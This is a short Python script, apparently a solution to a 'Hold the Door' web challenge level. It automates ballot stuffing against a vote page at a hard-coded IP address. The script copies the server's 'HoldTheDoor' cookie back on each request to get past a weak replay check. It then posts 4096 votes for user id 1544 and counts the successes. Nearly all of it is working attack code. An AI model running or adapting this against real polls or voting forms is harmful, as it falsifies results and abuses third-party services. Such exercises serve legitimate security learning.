#!/usr/bin/python3
import requests
success = 0
failures = 0

print("Starting Count...")

URL = 'http://158.69.76.135/level1.php'
user_data = {
    'id': '1544',
    'holdthedoor': 'submit',
    'key': 0
}

cookies = {
    'HoldTheDoor': '0'
}

r = requests.get(URL)
for _ in range (4096):
    cookies['holdthedoor'] = r.cookies['HoldTheDoor']
    r = requests.post(URL, data = user_data, cookies = cookies)
    if (r.status_code == 200):
        success = success + 1
    else:
        failures = failures + 1

print("you voted {} times for 1544 user". format(success))
print("Successes {}\nFailures - {}".format(success, failures))
